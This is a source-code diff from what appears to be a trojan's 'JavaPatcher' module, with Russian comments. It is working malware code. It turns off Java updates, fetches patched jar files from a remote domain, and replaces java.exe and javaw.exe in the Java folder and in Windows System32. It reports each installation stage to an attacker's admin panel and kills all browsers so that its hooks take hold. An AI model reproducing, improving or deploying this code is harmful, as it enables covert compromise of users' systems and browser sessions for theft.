@@ -541,7 +541,6 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExew, crcName ) )
 		return false;
 
-	SendLogToAdmin(2);
 	//загрузка в папку ALLUSERSPROFILE
 	//GetAllUsersProfile( Path, sizeof(Path) );
 	if( GetWorkFolder(Path) == 0 )
@@ -583,7 +582,6 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath2, crcName ) )
 		return false;
 
-	SendLogToAdmin(3);
 
 	addUrl = "javassist.jar";
 	crcName = addUrl;
@@ -595,6 +593,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
 		return false;
 
+	SendLogToAdmin(2);
 	DBG( "JavaPatcher",  "Downloading Complete" );
 
 	m_lstrcpy( fileName, Path );
@@ -934,12 +933,11 @@ static bool WJFile()
 	return File::IsExists(wj);
 }
 
-static bool ReplacementExe(const char* java, const char* javao, const char* javaExe)
+static bool ReplacementExe(const char* java, const char* javao, const char* javaExe, const char* folderJava )
 {
 	MemPtr<MAX_PATH> srcJava, dstJava;
-	m_lstrcpy( srcJava, javaHome );
-	pPathAppendA( srcJava.str(), "bin" );
-	m_lstrcpy( dstJava, srcJava );
+	m_lstrcpy( srcJava, folderJava );
+	m_lstrcpy( dstJava, folderJava );
 	pPathAppendA( srcJava.str(), java );
 	pPathAppendA( dstJava.str(), javao );
 	bool ret = true;
@@ -951,7 +949,8 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 		}
 		else
 		{
-			DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
+			int err = pGetLastError();
+			DBG( "JavaPatcher", "not rename %s -> %s, error %d", srcJava.str(), dstJava.str(), err );
 			//pMoveFileExA( srcJava.str(), dstJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 			//pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 			ret = false;
@@ -962,10 +961,12 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 		if( pCopyFileA( javaExe, srcJava.str(), FALSE ) )
 		{
 			DBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
-			pDeleteFileA(javaExe);
 		}
 		else //не удалось скопировать, сделаем это после ребута
 		{
+			ret = false;
+			int err = pGetLastError();
+			DBG( "JavaPatcher", "not copy %s -> %s, error %d", javaExe, srcJava.str(), err );
 			//pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 		}
 	}
@@ -989,7 +990,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	OffUpdateJava();
 
 	MemPtr<513> user;
-	MemPtr<MAX_PATH> path, javaExe, javaExew;
+	MemPtr<MAX_PATH> path, javaExe, javaExew, folderJava;
 
 	PCHAR javaUrl = STR::New( 2, domain, "rt_jar/" );
 
@@ -1019,6 +1020,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 
 			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
 			{
+				SendLogToAdmin(3);
 				DBG( "JavaPatcher", "copy %s -> %s OK", srcFile, dstFile );
 			}
 			else
@@ -1029,14 +1031,25 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			}
 			res = true;
 			//Подменяем яву
-			res &= ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() );
-			res &= ReplacementExe( "javaw.exe", Patched_Jawaw_Name, javaExew.str() );
-			if( res )
-			{
-				//сообщаем админке, что ява патч установлен
-				SendLogToAdmin(4);
-			}
-			else //не удалось что-то заменить, делаем перезагрузку
+			//Сначала в основной папке явы
+			m_lstrcpy( folderJava.str(), javaHome );
+			pPathAppendA( folderJava.str(), "bin" );
+			res &= ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str(), folderJava.str() );
+			res &= ReplacementExe( "javaw.exe", Patched_Jawaw_Name, javaExew.str(), folderJava.str() );
+			if( res ) SendLogToAdmin(4);
+
+			//подменяем в системной папке Windows\System32
+			pSHGetFolderPathA( 0, CSIDL_SYSTEM,  0, 0, folderJava.str() );
+			bool res1 = ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str(), folderJava.str() );
+			res1 &= ReplacementExe( "javaw.exe", Patched_Jawaw_Name, javaExew.str(), folderJava.str() );
+			if( res1 ) SendLogToAdmin(5);
+
+			pDeleteFileA(javaExe.str());
+			pDeleteFileA(javaExew.str());
+			
+			res |= res1;
+
+			if( !res ) //не удалось что-то заменить, делаем перезагрузку
 			{
 				resPatch = 4; //не заменились java.exe и javaw.exe
 				#ifdef KillOs_RebootH
@@ -1044,6 +1057,8 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				//Reboot();
 				#endif
 			}
+			else
+				SendLogToAdmin(6); //успешная установка патча
 		};
 
 		if( resPatch > 0 ) //все файлы загрузились но по какой-то причине не установлся патч
@@ -1057,7 +1072,6 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			KillAllBrowsers(); //уничтожаем все браузеры, чтобы патч работал через хуки
 		}
 	}
-	SendLogToAdmin(5);
 
 	STR::Free(javaUrl);
 
